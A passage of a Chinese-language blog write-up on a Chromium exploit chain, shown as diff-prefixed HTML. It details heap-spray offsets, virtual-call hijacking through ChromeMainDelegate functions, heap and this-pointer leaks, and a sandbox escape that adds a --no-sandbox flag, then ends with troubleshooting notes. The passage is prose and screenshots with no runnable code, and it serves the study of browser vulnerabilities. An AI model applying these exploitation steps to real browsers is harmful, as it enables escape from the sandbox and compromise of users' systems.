+而InstalledAppProviderImpl::FilterInstalledApps在调用虚函数GetProcess时会从内存中获取一个地址将其加0x48并在此处获取一个函数去执行，所以可以将ChromeMainDelegate虚表地址+(0x70-0x48)填入堆喷数据中，当InstalledAppProviderImpl::FilterInstalledApps去调用GetProcess时就会转入ChromeMainDelegate::CreateContentClient函数<br>
+<img src="https://img-blog.csdnimg.cn/71e745c913434f839c8942f326b8590d.png" alt="在这里插入图片描述"><br>
+在ChromeMainDelegate::CreateContentClient函数执行后会将堆喷数据地址+8偏移处的地址读出并再读出该地址0xD0偏移处的地址并调用，此处对应GetBrowserContext虚函数调用。于是可以将ChromeMainDelegate虚表地址-(0xD0-0x70)填入堆喷数据中当GetBrowserContext被调用时会再次转入ChromeMainDelegate::CreateContentClient函数<br>
+<img src="https://img-blog.csdnimg.cn/13895f5ba32e4f2a9540cde06045e4d7.png" alt="在这里插入图片描述"><br>
+最后在调用虚函数IsOffTheRecord时需要找到一个可以泄露堆地址的函数填入相应位置，通过查找找到符合条件的虚函数content::WebContentsImpl::GetWakeLockContext，由于此函数还会将this指针填入堆地址+0x8偏移处，所以也可以为后续的this地址泄露提供方便。<br>
+<img src="https://img-blog.csdnimg.cn/3019d8752d804d2299f6611a5a109151.png" alt="在这里插入图片描述"><br>
+<img src="https://img-blog.csdnimg.cn/a360ff56082c4f85a4e74d9f9c9d31e6.png" alt="在这里插入图片描述"><br>
+此函数会创建一块内存用作对象内存，并会将此内存地址写入this+0x10+0x650偏移处，也就是堆喷占位数据的0x660偏移处</p>
+<p><img src="https://img-blog.csdnimg.cn/17fd7c4ba680402c88687fb809b3fbdb.png" alt="在这里插入图片描述"><br>
+<img src="https://img-blog.csdnimg.cn/9af2c4e88ecd455db8dff84dada389d9.png" alt="在这里插入图片描述"><br>
+但要注意的是content::WebContentsImpl::GetWakeLockContext函数会先去判断this+0x10+0x650偏移处是否为0，如果为0才可以进行创建堆内存并写入this+0x10+0x650的操作<br>
+<img src="https://img-blog.csdnimg.cn/ace3cdb1d13f4fc29a09c8da8f7fd603.png" alt="在这里插入图片描述"><br>
+通过以上操作，在经过<code>render_frame_host_-&gt;GetProcess()-&gt;GetBrowserContext()-&gt;IsOffTheRecord()</code>后就可以在堆喷占位数据的0x660偏移处得到一个需要的堆地址</p>
+<h4><a id="this_245"></a>this地址泄露</h4>
+<p>由于在上一步操作中已经泄露了堆地址并且还将this指针写入了堆地址+0x8偏移处，所以可以利用前面泄露堆地址的思路将UAF漏洞再触发一次，并把之前拿到的泄露的堆地址写入堆喷占位数据的对应偏移处即可获取到this指针，由于前面的漏洞利用this指针正好指向我们可控的堆喷占位数据，拿到了this地址也就得到了当前可控数据的地址。<br>
+继续将ChromeMainDelegate::CreateContentClient函数放入GetProcess与GetBrowserContext函数对应的调用位置，现在只需要再找到一个符合条件可以将this指针从堆地址中获取到的函数，通过查找找到<code>anonymous namespace'::DictionaryIterator::Start</code>函数正好符合要求。<br>
+<img src="https://img-blog.csdnimg.cn/950a31d7635c4bb0bf47df1012393b5e.png" alt="在这里插入图片描述"><br>
+结合调试再通过与泄露堆地址一样再次触发UAF漏洞便可得到this指针<br>
+<img src="https://img-blog.csdnimg.cn/0e045c4ce73d4e02ab118e4f1ff8e850.png" alt="在这里插入图片描述"><br>
+<img src="https://img-blog.csdnimg.cn/c32d376f17a6474ab7daaa8949f212ca.png" alt="在这里插入图片描述"></p>
+<h3><a id="_252"></a>沙盒逃逸</h3>
+<p>沙河逃逸的思路比较简单，通过回调去执行SetCommandLineFlagsForSandboxType函数将–no-sandbox参数添加到current_process_commandline_中。<br>
+首先需要找到一个可以调用回调函数的虚函数，通过查找找到content::responsiveness::MessageLoopObserver::DidProcessTask函数<br>
+<img src="https://img-blog.csdnimg.cn/31ce620cdd054a948698143b5681c6be.png" alt="在这里插入图片描述"><br>
+现在再找到一个可以传递多个参数的回调函数，类似如下形式的<img src="https://img-blog.csdnimg.cn/12db32452dac4ed08973cf6d2537f48e.png" alt="在这里插入图片描述"><br>
+然后将SetCommandLineFlagsForSandboxType函数地址填入被泄露了地址的buffer的相应偏移处就可以将沙箱关闭，但调用SetCommandLineFlagsForSandboxType函数还需要先得到全局变量current_process_commandline_<img src="https://img-blog.csdnimg.cn/4fcb46fb4dab483e96533b671d2287a3.png" alt="在这里插入图片描述"><br>
+通过extensions::SizeConstraints::set_minimum_size函数将current_process_commandline_中保存的指针拷贝进前文中已经被泄露地址的可控地址中。<br>
+<img src="https://img-blog.csdnimg.cn/43b8897c163347808b8da8e86d61f078.png" alt="在这里插入图片描述"><br>
+最后调用SetCommandLineFlagsForSandboxType函数，将–no-sandbox(0)标志添加进全局变量current_process_commandline_中<br>
+<img src="https://img-blog.csdnimg.cn/6aebe0a10237471e86b1b4db44e8c22a.png" alt="在这里插入图片描述"><br>
+最后生成新的渲染器过程（例如，使用iframe到其他受控原点或开启新的Tab），并再次使用渲染器漏洞利用(刷新)即可成功。<br>
+<img src="https://img-blog.csdnimg.cn/64d5bbd523f54138b5748c9cfa6225db.gif" alt="在这里插入图片描述"></p>
+<h2><a id="_264"></a>总结</h2>
+<ul>
+<li>21224漏洞触发后在触发1062091前浏览器就产生崩溃——手动delete清理掉oob数组</li>
+<li>在开启mojo时修改RenderFrameImpl对象相应变量导致页面崩溃——21224中构造的读写原语在循环体中同时频繁读写会导致此问题，去掉部分不必要的读或写操作</li>
+<li>将相应成员变量值写入对应的RenderFrameImpl对象偏移后mojo依然没有开启——在 81.0.4044.0版本chromium中在写入enabled_bindings_时需要将g_frame_map中拿到的RenderFrameImpl对象地址加0x68再加enabled_bindings_所在偏移，而IsMainFrame中用到的成员变量就在g_frame_map中拿到的RenderFrameImpl对象的0x88偏移处。</li>
+<li>原POC中用到的MojoInterfaceInterceptor需要开启MojoJSTest绑定才能使用——使用其他方法传递sub frame中的句柄给main frame，例如在sub frame的onload事件中使用contentWindow获取其句柄再传递给main frame，但此方法直接在本地执行时会出现跨域的问题需要起一个服务器去访问执行。</li>
+</ul>
+</div>
+</body>
+
+</html>
